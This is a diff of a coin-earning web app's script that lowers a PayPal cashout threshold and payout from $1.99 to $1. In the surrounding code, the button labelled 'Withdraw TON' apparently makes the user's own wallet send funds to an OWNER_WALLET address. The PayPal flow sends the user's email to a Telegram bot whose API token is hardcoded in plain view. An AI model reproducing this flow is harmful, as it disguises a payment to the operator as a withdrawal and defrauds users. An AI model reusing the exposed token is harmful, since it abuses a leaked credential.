@@ -448,7 +448,7 @@
       try{withdrawBtn.disabled=true;withdrawBtn.textContent='Waiting...';await ui.sendTransaction({validUntil:Math.floor(Date.now()/1000)+300,messages:[{address:OWNER_WALLET,amount:amountNano}]});state.coins-=needed;saveState();render();alert(`Success: ${needed} coins sent as TON.`);}catch(err){alert('Tx failed.');}finally{withdrawBtn.textContent='Withdraw TON';updateWithdrawUI();}});
 
     // --- PAYPAL CASHOUT ---
-    const PAYPAL_COST = 50000;
+    const PAYPAL_COST = 30000;
     const paypalBtn = document.getElementById('paypalCashoutBtn');
     const paypalEmailInput = document.getElementById('paypalEmail');
     const paypalStatus = document.getElementById('paypalStatus');
@@ -458,7 +458,7 @@
       if(paypalClaimed){
         paypalBtn.disabled = true;
         paypalBtn.textContent = "Already claimed";
-        paypalStatus.textContent = "You already received $1.99";
+        paypalStatus.textContent = "You already received $1";
         return;
       }
 
@@ -472,10 +472,10 @@
     paypalEmailInput.addEventListener('input', updatePaypalUI);
 
     paypalBtn.addEventListener('click', ()=>{
-      if(state.coins < PAYPAL_COST){alert(`You need at least ${PAYPAL_COST} coins to cash out $1.99!`);return;}
+      if(state.coins < PAYPAL_COST){alert(`You need at least ${PAYPAL_COST} coins to cash out $1!`);return;}
       const email = paypalEmailInput.value.trim();
       if(!email){alert("Enter PayPal email");return;}
-      const confirmSend = confirm(`Send $1.99 MANUALLY to this PayPal email:\n\n${email}\n\nAfter sending, click OK`);
+      const confirmSend = confirm(`Send $1 MANUALLY to this PayPal email:\n\n${email}\n\nAfter sending, click OK`);
       if(!confirmSend) return;
 
       fetch("https://api.telegram.org/bot8447944744:AAHkD4lgqRbzHW7rYsBuw5g0qeow_ke43Wg/sendMessage", {
